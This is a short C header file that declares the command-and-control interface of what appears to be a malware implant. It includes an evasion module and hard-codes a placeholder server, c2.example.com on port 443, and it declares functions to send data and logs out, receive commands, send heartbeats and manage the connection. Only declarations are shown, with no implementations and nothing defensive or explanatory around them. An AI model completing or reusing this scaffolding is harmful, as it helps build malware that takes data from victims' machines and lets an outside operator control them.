#ifndef C2_COMMUNICATION_FIXED_H
#define C2_COMMUNICATION_FIXED_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include "config.h"
#include "evasion.h"

// C2 configuration
#define C2_SERVER "c2.example.com"
#define C2_PORT 443
#define C2_PROTOCOL "HTTPS"

// C2 initialization and cleanup
int c2_init(void);
void c2_cleanup(void);

// Communication functions
int c2_send_data(const char *data, size_t size);
int c2_receive_data(char *buffer, size_t buffer_size);
int c2_send_logs(const char *log_data, size_t log_size);
int c2_receive_command(char *buffer, size_t buffer_size);

// Connection management
int c2_connect(void);
void c2_disconnect(void);
int c2_is_connected(void);

// Utility functions
void c2_heartbeat(void);
int c2_check_server_status(void);

#endif // C2_COMMUNICATION_FIXED_H